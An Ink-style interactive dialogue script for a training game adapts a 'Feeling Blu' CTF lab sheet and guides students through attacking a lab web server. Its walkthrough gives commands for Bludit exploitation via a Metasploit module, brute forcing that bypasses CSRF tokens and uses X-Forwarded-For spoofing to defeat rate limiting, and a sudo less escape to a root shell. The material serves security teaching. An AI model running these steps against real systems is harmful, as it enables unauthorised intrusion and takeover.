// Feeling Blu Challenge - Web Security CTF Lab Sheet
// Based on HacktivityLabSheets: introducing_attacks/9_feeling_blu.md
// Author: Anatoliy Gorbenko, Z. Cliffe Schreuders, Andrew Scholey
// License: CC BY-SA 4.0

// Global persistent state
VAR instructor_rapport = 0
VAR ctf_mastery = 0
VAR challenge_mode = "guided" // "guided" or "ctf"

// External variables
EXTERNAL player_name

=== start ===
CTF Challenge Coordinator: Welcome, Agent {player_name}. I'm your coordinator for the "Feeling Blu" CTF Challenge.

~ instructor_rapport = 0
~ ctf_mastery = 0

CTF Challenge Coordinator: This is your final test - a comprehensive Capture The Flag challenge that brings together everything you've learned.

CTF Challenge Coordinator: You'll exploit a web server, gain access, escalate privileges, and hunt for flags. This simulates a real-world penetration test from start to finish.

CTF Challenge Coordinator: Before we begin, you need to choose how you want to approach this challenge.

-> choose_path

=== choose_path ===
CTF Challenge Coordinator: How do you want to tackle this CTF challenge?

+ [Pure CTF mode - minimal guidance, maximum challenge]
    ~ challenge_mode = "ctf"
    CTF Challenge Coordinator: Excellent choice! You'll get the full Capture The Flag experience.

    CTF Challenge Coordinator: I'll give you the tools and objectives, but you'll need to figure out the approach yourself.

    CTF Challenge Coordinator: Use everything you've learned: scanning, exploitation, privilege escalation, and persistence.

    CTF Challenge Coordinator: Only come back for hints if you're truly stuck. Good luck!

    ~ ctf_mastery += 20
    -> ctf_mode_hub

+ [Guided mode - walk me through the techniques]
    ~ challenge_mode = "guided"
    CTF Challenge Coordinator: A wise choice for learning! I'll guide you through each phase with explanations.

    CTF Challenge Coordinator: You'll learn web application exploitation, brute forcing, post-exploitation, and privilege escalation with structured guidance.

    CTF Challenge Coordinator: This approach ensures you understand not just how to exploit, but why each technique works.

    ~ instructor_rapport += 10
    -> guided_mode_hub

=== ctf_mode_hub ===
CTF Challenge Coordinator: This is CTF mode - you're on your own! Here's what I can tell you:

CTF Challenge Coordinator: Target: A web server running on your victim VM.

CTF Challenge Coordinator: Objectives: Find multiple flags, gain shell access, escalate to root.

CTF Challenge Coordinator: Tools available: Nmap, Dirb, Nikto, Metasploit, OWASP ZAP, and more.

+ [What tools should I start with?]
    CTF Challenge Coordinator: Think about the attack methodology: reconnaissance, scanning, exploitation, post-exploitation, privilege escalation.

    CTF Challenge Coordinator: Start by discovering what's running: Nmap for services, Dirb and Nikto for web enumeration.

    CTF Challenge Coordinator: Look for hidden files, admin panels, and leaked credentials.

    ~ instructor_rapport += 5

+ [I'm stuck - give me a hint about reconnaissance]
    -> ctf_recon_hints

+ [I'm stuck - give me a hint about exploitation]
    -> ctf_exploit_hints

+ [I'm stuck - give me a hint about privilege escalation]
    -> ctf_privesc_hints

+ [Tell me about the web security tools]
    -> web_tools_intro

+ [I want to switch to guided mode]
    -> switch_to_guided

+ [I'm done - show me the solution walkthrough]
    -> guided_mode_hub

+ [That's all for now]
    #exit_conversation
    -> END

=== ctf_recon_hints ===
CTF Challenge Coordinator: Alright, here's a hint for reconnaissance:

CTF Challenge Coordinator: Start with Nmap to identify services and versions: nmap -sV TARGET_IP

CTF Challenge Coordinator: Use Dirb to find hidden directories: dirb http://TARGET_IP

CTF Challenge Coordinator: Use Nikto for web vulnerabilities: nikto -h http://TARGET_IP

CTF Challenge Coordinator: Look carefully at discovered files - some contain very useful information about usernames and passwords!

CTF Challenge Coordinator: The CMS being used might have known exploits. Identify what CMS is running.

~ instructor_rapport += 5

-> ctf_mode_hub

=== ctf_exploit_hints ===
CTF Challenge Coordinator: Here's a hint for exploitation:

CTF Challenge Coordinator: You should have discovered Bludit CMS running on the server.

CTF Challenge Coordinator: Search Metasploit for Bludit exploits: search bludit

CTF Challenge Coordinator: You'll need both a username and password - these might have been leaked in hidden files.

CTF Challenge Coordinator: If you only have the username, consider brute-forcing the password using OWASP ZAP.

CTF Challenge Coordinator: The Bludit vulnerability allows arbitrary code execution and should give you a Meterpreter shell.

~ instructor_rapport += 5

-> ctf_mode_hub

=== ctf_privesc_hints ===
CTF Challenge Coordinator: Here's a hint for privilege escalation:

CTF Challenge Coordinator: After gaining initial access, check what sudo commands your user can run: sudo -l

CTF Challenge Coordinator: If your user can run certain commands with sudo, look for ways to escape from those commands to get a root shell.

CTF Challenge Coordinator: The 'less' command is particularly interesting - it can execute shell commands with !<command>

CTF Challenge Coordinator: If you can run 'less' with sudo, you can escape to a root shell!

~ instructor_rapport += 5

-> ctf_mode_hub

=== switch_to_guided ===
CTF Challenge Coordinator: Switching to guided mode. I'll walk you through the complete solution.

~ challenge_mode = "guided"

-> guided_mode_hub

=== guided_mode_hub ===
CTF Challenge Coordinator: Welcome to guided mode. I'll walk you through each phase of the challenge.

+ [Part 1: Information gathering and reconnaissance]
    -> phase_1_recon

+ [Part 2: Exploitation and gaining access]
    -> phase_2_exploitation

+ [Part 3: Optional - Brute forcing with OWASP ZAP]
    -> phase_3_bruteforce

+ [Part 4: Post-exploitation and flag hunting]
    -> phase_4_post_exploit

+ [Part 5: Privilege escalation to root]
    -> phase_5_privesc

+ [Tell me about web security tools first]
    -> web_tools_intro

+ [Show me the complete solution]
    -> complete_walkthrough

+ [Switch to CTF mode (no more guidance)]
    ~ challenge_mode = "ctf"
    -> ctf_mode_hub

+ [That's all for now]
    #exit_conversation
    -> END

=== web_tools_intro ===
CTF Challenge Coordinator: Let me introduce the key web security tools you'll need.

~ instructor_rapport += 5

CTF Challenge Coordinator: **Dirb** is a web content scanner that finds hidden files and directories using dictionary attacks.

CTF Challenge Coordinator: **Nikto** is a web vulnerability scanner that checks for dangerous files, outdated software, and misconfigurations.

CTF Challenge Coordinator: **OWASP ZAP** is an intercepting proxy that lets you capture, modify, and replay HTTP requests - perfect for brute forcing.

+ [How do I use Dirb?]
    CTF Challenge Coordinator: Dirb is straightforward: dirb http://TARGET_IP

    CTF Challenge Coordinator: It uses a built-in dictionary to test common paths like /admin/, /backup/, /config/, etc.

    CTF Challenge Coordinator: Pay attention to discovered files - they often contain credentials or sensitive configuration data.

    CTF Challenge Coordinator: Right-click discovered URLs to open them in your browser and examine their contents.

    ~ instructor_rapport += 5

+ [How do I use Nikto?]
    CTF Challenge Coordinator: Nikto scans for web vulnerabilities: nikto -h http://TARGET_IP

    CTF Challenge Coordinator: It checks for over 6,000 security issues including dangerous files, server misconfigurations, and known vulnerabilities.

    CTF Challenge Coordinator: The output shows each finding with references for more information.

    CTF Challenge Coordinator: Nikto results help you understand what attacks might be successful.

    ~ instructor_rapport += 5

+ [How do I use OWASP ZAP?]
    CTF Challenge Coordinator: OWASP ZAP acts as a proxy between your browser and the web server.

    CTF Challenge Coordinator: It intercepts HTTP requests and responses, allowing you to modify and replay them.

    CTF Challenge Coordinator: This is incredibly useful for brute forcing login forms, especially those with CSRF protection.

    CTF Challenge Coordinator: You can also use it to bypass IP-based rate limiting with the X-Forwarded-For header.

    ~ instructor_rapport += 5

- -> {challenge_mode == "ctf": ctf_mode_hub | guided_mode_hub}

=== phase_1_recon ===
CTF Challenge Coordinator: Phase 1 is all about information gathering - discovering what you're dealing with before launching attacks.

~ instructor_rapport += 5

CTF Challenge Coordinator: The attack methodology follows this sequence: reconnaissance, scanning, exploitation, post-exploitation, and privilege escalation.

CTF Challenge Coordinator: Each phase builds on the previous, so thorough reconnaissance is crucial.

+ [What should I scan for?]
    CTF Challenge Coordinator: Start with network reconnaissance: nmap -sV TARGET_IP

    CTF Challenge Coordinator: This identifies open ports, running services, and software versions.

    CTF Challenge Coordinator: Then scan the web application: dirb http://TARGET_IP

    CTF Challenge Coordinator: Follow up with: nikto -h http://TARGET_IP

    CTF Challenge Coordinator: Look for admin panels, configuration files, backup files, and anything that might contain credentials.

    ~ instructor_rapport += 5

+ [What am I looking for specifically?]
    CTF Challenge Coordinator: You're looking for several things:

    CTF Challenge Coordinator: What CMS (Content Management System) is running? This tells you what exploits might work.

    CTF Challenge Coordinator: Are there leaked credentials in discovered files? Check text files, logs, and backups.

    CTF Challenge Coordinator: Is there an admin login page? You might need to access it.

    CTF Challenge Coordinator: What server software and versions are running? This helps identify known vulnerabilities.

    CTF Challenge Coordinator: There's also a flag hidden in one of the discovered files!

    ~ instructor_rapport += 5

+ [Walk me through the reconnaissance process]
    CTF Challenge Coordinator: Here's the step-by-step process:

    CTF Challenge Coordinator: 1. Run Nmap: nmap -sV -p- TARGET_IP (scan all ports with version detection)

    CTF Challenge Coordinator: 2. Run Dirb: dirb http://TARGET_IP (find hidden directories and files)

    CTF Challenge Coordinator: 3. Run Nikto: nikto -h http://TARGET_IP (identify web vulnerabilities)

    CTF Challenge Coordinator: 4. Browse discovered URLs - open them in Firefox to see what they contain

    CTF Challenge Coordinator: 5. Look for patterns: usernames on the website, admin pages, leaked files

    CTF Challenge Coordinator: 6. Document everything - the CMS name, discovered usernames, any found credentials

    CTF Challenge Coordinator: The reconnaissance might reveal Bludit CMS with an admin login at /admin/

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_2_exploitation ===
CTF Challenge Coordinator: Phase 2 is exploitation - using discovered vulnerabilities to gain access.

~ instructor_rapport += 5

CTF Challenge Coordinator: Based on your reconnaissance, you should have identified Bludit CMS running on the server.

CTF Challenge Coordinator: Bludit has known vulnerabilities that we can exploit using Metasploit.

+ [How do I find Bludit exploits?]
    CTF Challenge Coordinator: In Metasploit, search for Bludit: search bludit

    CTF Challenge Coordinator: You'll find several modules. Look for ones related to code execution or file upload.

    CTF Challenge Coordinator: Use info to read about each exploit: info exploit/linux/http/bludit_upload_images_exec

    CTF Challenge Coordinator: This particular exploit allows arbitrary code execution through image upload functionality.

    ~ instructor_rapport += 5

+ [What do I need to exploit Bludit?]
    CTF Challenge Coordinator: The Bludit exploit requires several pieces of information:

    CTF Challenge Coordinator: RHOSTS: The target IP address

    CTF Challenge Coordinator: BLUDITUSER: The Bludit admin username (should have been discovered during recon)

    CTF Challenge Coordinator: BLUDITPASS: The admin password (might have been leaked, or you'll need to brute force it)

    CTF Challenge Coordinator: TARGETURI: Typically / (the root of the web server)

    CTF Challenge Coordinator: The exploit will give you a Meterpreter shell if successful!

    ~ instructor_rapport += 5

+ [What if I don't have the password?]
    CTF Challenge Coordinator: If you found the username but not the password, you have options:

    CTF Challenge Coordinator: Check all discovered files thoroughly - passwords are sometimes leaked in config files or backups

    CTF Challenge Coordinator: If truly not found, you can brute force it using OWASP ZAP (covered in optional Phase 3)

    CTF Challenge Coordinator: Bludit has CSRF protection and rate limiting, making brute forcing tricky but possible

    ~ instructor_rapport += 5

+ [Walk me through the exploitation]
    CTF Challenge Coordinator: Here's the complete exploitation process:

    CTF Challenge Coordinator: 1. Start Metasploit: msfconsole

    CTF Challenge Coordinator: 2. Search: search bludit

    CTF Challenge Coordinator: 3. Use the upload_images exploit: use exploit/linux/http/bludit_upload_images_exec

    CTF Challenge Coordinator: 4. Show options: show options

    CTF Challenge Coordinator: 5. Set target: set RHOSTS TARGET_IP

    CTF Challenge Coordinator: 6. Set username: set BLUDITUSER admin (or discovered username)

    CTF Challenge Coordinator: 7. Set password: set BLUDITPASS <discovered_password>

    CTF Challenge Coordinator: 8. Run exploit: exploit

    CTF Challenge Coordinator: If successful, you'll get a Meterpreter shell! This is your foothold in the system.

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_3_bruteforce ===
CTF Challenge Coordinator: Phase 3 is optional - brute forcing the Bludit password if you only have the username.

~ instructor_rapport += 5

CTF Challenge Coordinator: Bludit has protections against brute forcing: CSRF tokens and IP-based rate limiting.

CTF Challenge Coordinator: OWASP ZAP can bypass these protections with the right configuration.

+ [How does CSRF protection work?]
    CTF Challenge Coordinator: CSRF (Cross-Site Request Forgery) tokens are randomly generated by the server.

    CTF Challenge Coordinator: The server sends a token in each response, and the client must include it in the next request.

    CTF Challenge Coordinator: This prevents simple replay attacks because each request needs the current token.

    CTF Challenge Coordinator: OWASP ZAP can extract tokens from responses and insert them into requests automatically.

    ~ instructor_rapport += 5

+ [How does rate limiting protection work?]
    CTF Challenge Coordinator: After a certain number of failed login attempts from the same IP, Bludit blocks that IP temporarily.

    CTF Challenge Coordinator: You'll see messages like "Too many incorrect attempts. Try again in 30 minutes."

    CTF Challenge Coordinator: However, we can bypass this using the X-Forwarded-For HTTP header.

    CTF Challenge Coordinator: By randomizing the X-Forwarded-For IP, we make each attempt appear to come from a different client.

    ~ instructor_rapport += 5

+ [Walk me through the ZAP brute force process]
    CTF Challenge Coordinator: This is complex, so pay attention:

    CTF Challenge Coordinator: 1. Launch OWASP ZAP and configure it as a proxy

    CTF Challenge Coordinator: 2. Install the random_x_forwarded_for_ip.js script from the ZAP community scripts

    CTF Challenge Coordinator: 3. Browse to the Bludit login page through ZAP

    CTF Challenge Coordinator: 4. Attempt a login to capture the HTTP request in ZAP's history

    CTF Challenge Coordinator: 5. Right-click the POST request and select "Fuzz..."

    CTF Challenge Coordinator: 6. Select the password field and add a payload with common passwords

    CTF Challenge Coordinator: 7. Add the X-Forwarded-For script as a message processor

    CTF Challenge Coordinator: 8. Launch the fuzzer and look for different HTTP response codes

    CTF Challenge Coordinator: Successful logins typically return 301 or 302 (redirect) instead of 200 (error message).

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_4_post_exploit ===
CTF Challenge Coordinator: Phase 4 is post-exploitation - exploring the compromised system and hunting for flags.

~ instructor_rapport += 5

CTF Challenge Coordinator: You should have a Meterpreter shell from the exploitation phase.

CTF Challenge Coordinator: Now it's time to explore the system, understand your access level, and find flags.

+ [What Meterpreter commands should I use?]
    CTF Challenge Coordinator: Essential Meterpreter commands for exploration:

    CTF Challenge Coordinator: getuid - Shows your current username

    CTF Challenge Coordinator: sysinfo - System information (OS, architecture, etc.)

    CTF Challenge Coordinator: pwd - Print working directory

    CTF Challenge Coordinator: ls - List files in current directory

    CTF Challenge Coordinator: cat filename - Read file contents

    CTF Challenge Coordinator: cd /path - Change directory

    CTF Challenge Coordinator: shell - Drop to OS shell (Ctrl-C to return to Meterpreter)

    ~ instructor_rapport += 5

+ [Where should I look for flags?]
    CTF Challenge Coordinator: Flags are hidden in various locations:

    CTF Challenge Coordinator: Check your current directory - there might be a flag right where you land

    CTF Challenge Coordinator: Look in user home directories: /home/username/

    CTF Challenge Coordinator: Different users might have different flags

    CTF Challenge Coordinator: Eventually, you'll need to check /root/ but that requires privilege escalation

    CTF Challenge Coordinator: Some flags might be in encrypted files - note encryption hints for later

    ~ instructor_rapport += 5

+ [How do I switch users?]
    CTF Challenge Coordinator: To switch users, you need to drop to an OS shell first:

    CTF Challenge Coordinator: From Meterpreter, run: shell

    CTF Challenge Coordinator: Now you have a Linux shell. Use: su username

    CTF Challenge Coordinator: However, you'll need the user's password to switch

    CTF Challenge Coordinator: If you discovered the Bludit admin user's password earlier, you can switch to that user

    CTF Challenge Coordinator: Return to Meterpreter with Ctrl-C when done

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_5_privesc ===
CTF Challenge Coordinator: Phase 5 is privilege escalation - gaining root access to fully control the system.

~ instructor_rapport += 5

CTF Challenge Coordinator: Your initial shell is likely running as the www-data user (the web server user) with limited privileges.

CTF Challenge Coordinator: To access all system files and read flags in /root/, you need to escalate to root.

+ [How do I check my privileges?]
    CTF Challenge Coordinator: From a shell, check your privileges:

    CTF Challenge Coordinator: whoami - Shows your username

    CTF Challenge Coordinator: id - Shows UID, GID, and groups

    CTF Challenge Coordinator: sudo -l - Lists commands you can run with sudo

    CTF Challenge Coordinator: Note: You might need a proper TTY terminal first: python3 -c 'import pty; pty.spawn("/bin/bash")'

    CTF Challenge Coordinator: This spawns a proper terminal that sudo will accept.

    ~ instructor_rapport += 5

+ [What's the sudo privilege escalation method?]
    CTF Challenge Coordinator: When you run sudo -l, you'll see what commands you can run as root.

    CTF Challenge Coordinator: If you can run /usr/bin/less with sudo, that's your ticket to root!

    CTF Challenge Coordinator: The 'less' command is a pager for viewing files, but it can also execute shell commands.

    CTF Challenge Coordinator: When viewing a file with less, press ! followed by a command to execute it.

    CTF Challenge Coordinator: Since less is running with sudo privileges, any command you run will execute as root!

    ~ instructor_rapport += 5

+ [Walk me through getting root access]
    CTF Challenge Coordinator: Here's the complete privilege escalation process:

    CTF Challenge Coordinator: 1. Drop to shell from Meterpreter: shell

    CTF Challenge Coordinator: 2. Spawn a proper terminal: python3 -c 'import pty; pty.spawn("/bin/bash")'

    CTF Challenge Coordinator: 3. Check sudo permissions: sudo -l

    CTF Challenge Coordinator: 4. You should see you can run less on a specific file

    CTF Challenge Coordinator: 5. Run that command with sudo: sudo /usr/bin/less /path/to/file

    CTF Challenge Coordinator: 6. When the file is displayed, type: !id

    CTF Challenge Coordinator: 7. You should see uid=0 (root!) in the output

    CTF Challenge Coordinator: 8. Now type: !/bin/bash

    CTF Challenge Coordinator: 9. You now have a root shell! Verify with: whoami

    CTF Challenge Coordinator: Now you can access /root/ and find the final flags!

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== complete_walkthrough ===
CTF Challenge Coordinator: Here's the complete solution walkthrough from start to finish:

~ instructor_rapport += 10
~ ctf_mastery += 20

CTF Challenge Coordinator: **Phase 1 - Reconnaissance:**

CTF Challenge Coordinator: nmap -sV -p- TARGET_IP

CTF Challenge Coordinator: dirb http://TARGET_IP

CTF Challenge Coordinator: nikto -h http://TARGET_IP

CTF Challenge Coordinator: Browse discovered files, find admin login at /admin/, discover Bludit CMS, find leaked credentials

CTF Challenge Coordinator: **Phase 2 - Exploitation:**

CTF Challenge Coordinator: msfconsole

CTF Challenge Coordinator: search bludit

CTF Challenge Coordinator: use exploit/linux/http/bludit_upload_images_exec

CTF Challenge Coordinator: set RHOSTS TARGET_IP

CTF Challenge Coordinator: set BLUDITUSER admin (or discovered username)

CTF Challenge Coordinator: set BLUDITPASS discovered_password

CTF Challenge Coordinator: exploit

CTF Challenge Coordinator: **Phase 3 - Post-Exploitation:**

CTF Challenge Coordinator: getuid, sysinfo, ls, cat flag.txt (in current directory)

CTF Challenge Coordinator: shell

CTF Challenge Coordinator: su bludit_admin (with discovered password)

CTF Challenge Coordinator: cat ~/flag.txt (in that user's home)

CTF Challenge Coordinator: **Phase 4 - Privilege Escalation:**

CTF Challenge Coordinator: python3 -c 'import pty; pty.spawn("/bin/bash")'

CTF Challenge Coordinator: sudo -l (discover you can run less on a specific file)

CTF Challenge Coordinator: sudo /usr/bin/less /path/to/file

CTF Challenge Coordinator: !id (verify root)

CTF Challenge Coordinator: !/bin/bash (spawn root shell)

CTF Challenge Coordinator: cd /root && ls (find final flags)

CTF Challenge Coordinator: That's the complete solution! Try to replicate it yourself now that you understand the approach.

-> guided_mode_hub

-> END
